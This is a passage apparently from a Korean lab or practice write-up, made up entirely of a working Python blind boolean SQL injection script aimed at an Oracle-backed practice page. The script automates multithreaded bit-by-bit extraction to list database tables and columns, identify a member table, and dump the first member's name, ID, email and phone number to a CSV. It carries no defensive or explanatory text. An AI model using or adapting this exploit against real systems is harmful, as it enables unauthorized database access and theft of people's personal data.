## 1. 공격 구문 및 소스코드

### 1.1. 공격 스크립트

```python
import argparse
import csv
import threading
import time
from concurrent.futures import ThreadPoolExecutor

import requests


URL = "https://lab.eqst.co.kr:8110/practice/practice01/detail"
BASE_ID = 61
WORKERS = 6
FIELDS = {
    "NAME": ("NAME", "MEMBERNAME", "MEMBER_NAME", "USERNAME", "USER_NAME"),
    "MEMBERID": ("MEMBERID", "MEMBER_ID", "USERID", "USER_ID", "LOGINID", "ID"),
    "EMAIL": ("EMAIL", "MEMBEREMAIL", "MEMBER_EMAIL", "USEREMAIL", "USER_EMAIL"),
    "PHONE": ("PHONE", "MOBILE", "TEL", "PHONENUMBER", "PHONE_NUMBER", "MOBILEPHONE"),
}
TABLE_WORDS = ("MEMBER", "USER", "ACCOUNT", "CUSTOMER", "CLIENT")


class Oracle:
    def __init__(self, cookie=""):
        self.headers = {"Cookie": cookie} if cookie else {}
        self.local = threading.local()
        true_text = self.get("1=1")
        false_text = self.get("1=0")
        unique = [
            line.strip()
            for line in true_text.splitlines()
            if len(line.strip()) > 20 and line.strip() not in false_text
        ]
        if not unique:
            raise RuntimeError("Cannot distinguish true and false responses")
        self.marker = max(unique, key=len)

    def session(self):
        if not hasattr(self.local, "value"):
            self.local.value = requests.Session()
            self.local.value.headers.update(self.headers)
        return self.local.value

    def get(self, condition):
        for attempt in range(4):
            try:
                response = self.session().get(
                    URL,
                    params={"id": f"{BASE_ID} AND ({condition})"},
                    timeout=(5, 30),
                )
                response.raise_for_status()
                return response.text
            except (requests.Timeout, requests.ConnectionError):
                if attempt == 3:
                    raise
                time.sleep(0.5 * (attempt + 1))

    def check(self, condition):
        return self.marker in self.get(condition)

    def number(self, query, limit=65535):
        low, high = 0, 1
        while high < limit and self.check(f"({query})>{high}"):
            low, high = high + 1, min(high * 2, limit)
        while low < high:
            middle = (low + high) // 2
            if self.check(f"({query})>{middle}"):
                low = middle + 1
            else:
                high = middle
        return low

    def text(self, query, ascii_only=False):
        if ascii_only:
            size = self.number(f"SELECT LENGTH(value) FROM ({query})")
        else:
            size = self.number(
                f"SELECT LENGTH(RAWTOHEX(UTL_RAW.CAST_TO_RAW(value)))/2 FROM ({query})"
            )
        print(f"0/{size}", end="", flush=True)

        def read_bit(job):
            position, bit = job
            if ascii_only:
                byte = f"SELECT ASCII(SUBSTR(value,{position},1)) FROM ({query})"
            else:
                byte = (
                    "SELECT TO_NUMBER(SUBSTR(RAWTOHEX(UTL_RAW.CAST_TO_RAW(value)),"
                    f"{position * 2 - 1},2),'XX') FROM ({query})"
                )
            return position, bit, self.check(f"BITAND(({byte}),{1 << bit})>0")

        bit_count = 7 if ascii_only else 8
        jobs = ((position, bit) for position in range(1, size + 1) for bit in range(bit_count))
        data = [0] * size
        completed = 0
        with ThreadPoolExecutor(max_workers=WORKERS) as pool:
            for position, bit, enabled in pool.map(read_bit, jobs):
                if enabled:
                    data[position - 1] |= 1 << bit
                completed += 1
                if completed % bit_count == 0:
                    print(f"\r{completed // bit_count}/{size}", end="", flush=True)
        print()
        raw = bytes(data)
        for encoding in ("utf-8", "euc-kr"):
            try:
                return raw.decode(encoding)
            except UnicodeDecodeError:
                pass
        return raw.decode("utf-8", errors="replace")


def tables(oracle):
    value = oracle.text(
        "SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP(ORDER BY table_name) "
        "value FROM user_tables",
        ascii_only=True,
    )
    return value.split(chr(30))


def member_table(table_names):
    ranked = sorted(
        table_names,
        key=lambda table: max(
            (len(word) for word in TABLE_WORDS if word in table.upper()), default=0
        ),
        reverse=True,
    )
    if not ranked or not any(word in ranked[0].upper() for word in TABLE_WORDS):
        raise RuntimeError("Member table could not be identified")
    return ranked[0]


def columns(oracle, table):
    value = oracle.text(
        "SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP(ORDER BY column_id) "
        f"value FROM user_tab_columns WHERE table_name='{table}'",
        ascii_only=True,
    )
    return value.split(chr(30))


def field_mapping(column_names):
    available = {column.upper(): column for column in column_names}
    mapping = {
        field: next((available[name] for name in names if name in available), None)
        for field, names in FIELDS.items()
    }
    if sum(value is not None for value in mapping.values()) < 2:
        raise RuntimeError("Member columns could not be identified")
    return mapping


def first_member(oracle, table, columns, mapping):
    values = [f"NVL(TO_CHAR({mapping[field]}),'')" if mapping[field] else "''" for field in FIELDS]
    joined = "||CHR(31)||".join(values)
    value = oracle.text(
        f"SELECT {joined} value FROM {table} WHERE ROWNUM=1"
    )
    return dict(zip(FIELDS, value.split(chr(31))))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cookie", default="")
    args = parser.parse_args()

    print("Connecting...", flush=True)
    oracle = Oracle(args.cookie)
    print("Reading tables...", flush=True)
    table_names = tables(oracle)
    print("\n========== TABLES ==========")
    for index, name in enumerate(table_names, 1):
        print(f"{index}. {name}")
    table = member_table(table_names)
    print(f"\nSelected table: {table}")
    print("Reading columns...", flush=True)
    column_names = columns(oracle, table)
    print("\n========== COLUMNS ==========")
    for index, name in enumerate(column_names, 1):
        print(f"{index}. {name}")
    mapping = field_mapping(column_names)
    print("Reading first member...", flush=True)
    row = first_member(oracle, table, column_names, mapping)
    headers = list(FIELDS)
    with open("first_member.csv", "w", newline="", encoding="utf-8-sig") as file:
        writer = csv.DictWriter(file, fieldnames=headers)
        writer.writeheader()
        writer.writerow({field: row.get(field, "") for field in headers})
    print("\n======= FIRST MEMBER =======")
    for field in headers:
        print(f"{field:<8}: {row.get(field, '')}")
    print("============================")
    print("CSV      : first_member.csv")


if __name__ == "__main__":
    main()
```
